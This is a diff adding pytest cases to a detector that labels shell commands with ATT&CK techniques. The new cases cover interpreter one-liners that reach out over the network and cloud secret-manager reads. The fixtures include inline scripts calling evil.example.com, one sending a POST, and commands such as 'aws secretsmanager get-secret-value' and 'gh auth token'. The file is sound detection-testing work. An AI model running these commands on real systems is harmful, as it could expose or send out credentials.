@@ -111,9 +111,100 @@ def test_interpreters_are_network_clients(command):
     assert technique(command) == "T1071.001"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "python3 -c 'import urllib.request;urllib.request.urlopen(\"https://evil.example.com\")'",
+        "node -e 'fetch(\"https://evil.example.com\", {method:\"POST\"})'",
+        "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://evil.example.com\"))'",
+        "perl -e 'use LWP::Simple; get(\"https://evil.example.com\")'",
+    ],
+)
+def test_single_quoted_inline_scripts_are_network_clients(command):
+    """The fix for interpreter egress was matched against the wrong view.
+
+    `INTERPRETER_NETWORK` read `literal`, which blanks single quotes, so only the
+    double-quoted spelling above ever fired. On Unix a one-liner is idiomatically
+    single-quoted, precisely so the shell does not expand what is inside it, and
+    that is the form an attacker reaches for. The corpus pinned the double-quoted
+    case alone, so the gap survived the commit that was meant to close it.
+    """
+    assert technique(command) == "T1071.001"
+    assert "net_egress" in traits(command)
+
+
 def test_an_interpreter_doing_nothing_networky_is_not_egress():
     assert technique('python -c "print(1)"') != "T1071.001"
     assert technique("python -m pytest -q") != "T1071.001"
+    assert technique("node -e 'console.log(1+1)'") != "T1071.001"
+
+
+def test_an_inline_script_must_be_run_not_quoted():
+    """Why the eval flag decides the view rather than the interpreter name.
+
+    Unmasking single quotes whenever an interpreter appears would re-open the
+    false positive the `literal` choice was protecting against. Requiring the
+    `-c`/`-e` flag to itself be unmasked keeps both: the body of a script that
+    is actually being run is code, and the same characters inside an `echo` are
+    prose. The verb must be unmasked, the arguments may be quoted.
+    """
+    assert technique("echo 'python -c \"urlopen(https://x.example.com)\"' >> n.md") != "T1071.001"
+    assert "net_egress" not in traits("echo 'node -e \"fetch(https://x.example.com)\"' > f.txt")
+
+
+# ----------------------------------------------------------------------
+# Secrets fetched from an API, not read from a file
+# ----------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "aws secretsmanager get-secret-value --secret-id prod/db",
+        "aws ssm get-parameter --name /prod/key --with-decryption",
+        "gh secret list --repo owner/repo",
+        "gh auth token",
+        "az keyvault secret show --name prod-db --vault-name kv",
+        "gcloud secrets versions access latest --secret=prod-db",
+        "vault kv get secret/prod/api",
+        "vault read secret/prod/api",
+        "kubectl get secret db -o yaml",
+    ],
+)
+def test_secret_manager_reads_are_credential_access(command):
+    """Credential recognition described files and environment variables.
+
+    Both are credentials at rest on this machine, which is only half of where
+    they live: every provider also hands them out through an API. These earned
+    `cloud_api` and generic Execution, so a secret fetched this way and then sent
+    off the box produced no credential half and no finding, which is the gap #40
+    left for the environment, one layer out.
+    """
+    assert "credential_access" in traits(command)
+    assert technique(command).startswith("T1552")
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "kubectl get secrets",
+        "gh secret set NPM_TOKEN --body xxx",
+        "git commit -m 'docs: explain aws secretsmanager get-secret-value'",
+        'gh issue comment 7 --body "use vault kv get to fetch it"',
+        "aws s3 ls s3://build-artifacts",
+        "kubectl get pods -o yaml",
+    ],
+)
+def test_naming_or_writing_a_secret_is_not_reading_one(command):
+    """The half that decides whether a platform team keeps this installed.
+
+    `kubectl get secrets` lists names and `-o yaml` prints the base64 values, so
+    only the second is a read. `gh secret set` writes a value and is how CI gets
+    configured. Someone listing secret names all day is exactly the reader a
+    noisy rule loses.
+    """
+    assert "credential_access" not in traits(command)
+    assert not technique(command).startswith("T1552")
 
 
 def test_quoting_a_url_does_not_hide_it():
